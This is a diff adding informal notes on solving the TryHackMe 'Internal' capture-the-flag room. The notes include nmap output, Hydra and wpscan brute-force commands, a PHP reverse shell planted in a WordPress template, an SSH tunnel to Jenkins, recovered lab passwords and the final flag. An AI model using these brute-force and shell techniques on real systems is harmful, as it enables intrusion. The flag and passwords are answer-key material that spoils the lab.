@@ -1,0 +1,137 @@
+Room Internal
+
+Black box
+
+Linux  // Wordpress  // SSH 
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-17 11:15 EST
+Nmap scan report for 10.10.210.220
+Host is up (0.12s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 9.79 seconds
+
+nmap -sC -sS -sV -T4 -O -n -Pn 10.10.210.220 -oN nmap2
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-17 11:19 EST
+Nmap scan report for 10.10.210.220
+Host is up (0.12s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
+|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
+|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=2/17%OT=22%CT=1%CU=31692%PV=Y%DS=2%DC=I%G=Y%TM=602D424
+OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=2%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ
+OS:(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)OPS(O1=M506ST11NW7%O2=M506ST11NW7%O
+OS:3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=F4B3%W2=
+OS:F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M506NNSN
+OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
+OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
+OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
+OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
+OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 35.58 seconds
+
+played around with ssh and smbclient got nowhere could not enumerate shares
+
+nmap --script smb-enum-shares.nse,smb-enum-users.nse 10.10.210.220 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-17 11:26 EST
+Nmap scan report for 10.10.210.220
+Host is up (0.11s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 7.65 seconds
+
+decided to go to gobuster ,,, it's finding plenty of stuff,,,
+
+went into blog  ,,, see a searchbar, login, and blog entry, 
+
+go buster found phpmyadmin ,,, 
+
+decided to try and hydra,,,
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.210.220 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1&target=index.php&token=cb365234ba12619591774bc1d17bac86:Access denied" -vv
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-17 11:46:02
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://10.10.210.220:80/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1&target=index.php&token=cb365234ba12619591774bc1d17bac86:Access denied
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[STATUS] 980.00 tries/min, 980 tries in 00:01h, 14343419 to do in 243:57h, 16 active
+[STATUS] 1048.33 tries/min, 3145 tries in 00:03h, 14341254 to do in 228:01h, 16 active
+[80][http-post-form] host: 10.10.210.220   login: admin
+[STATUS] attack finished for 10.10.210.220 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 
+
+went to writeup,,,
+
+wpscan — url IPaddr/blog -e vp,u
+
+wpscan — url ipaddr/blog — usernames admin — passwords rockyou.txt — max-threads 50
+
+admin:my2boys
+
+access to wordpress site,,
+
+insert php reverse into template 404 ,,,
+
+
+
+<ip>/blog/wp-content/themes/twentyseventeen/404.php   // to execute
+
+
+
+nc gives us www-data access
+we get an user crecentials cd /opt    wp-save.txt 
+
+aubreanna:bubb13guM!@#123
+
+ls -la  // reveals user.txt  and jenkins.txt says there is a jenkins server on 8080
+
+ssh tunnel 
+ssh -L 8080:172.17.0.2:8080 aubreanna@10.10.197.244
+
+now we can access jenking on localhost:8080 
+
+finally, made a rockyou500 , head -500 rockyou > rock500   ,,, that only took an hour, list worked great!
+
+having issues with jenkins, to just behave, won't connect,, and can't do much with no priv 
+
+got username:pass for jenkings
+
+admin:spongebob    /// you have to be kidding me,, 
+
+finally, after many tries with the goovy script,,, got in  /,,,, cd /opt  then ls -la and got, 
+
+root:tr0ub13guM!@#123
+
+ssh into root
+
+found root.txt 
+
+THM{d0ck3r_d3str0y3r}
+
+
+that was a lot, 
+
+
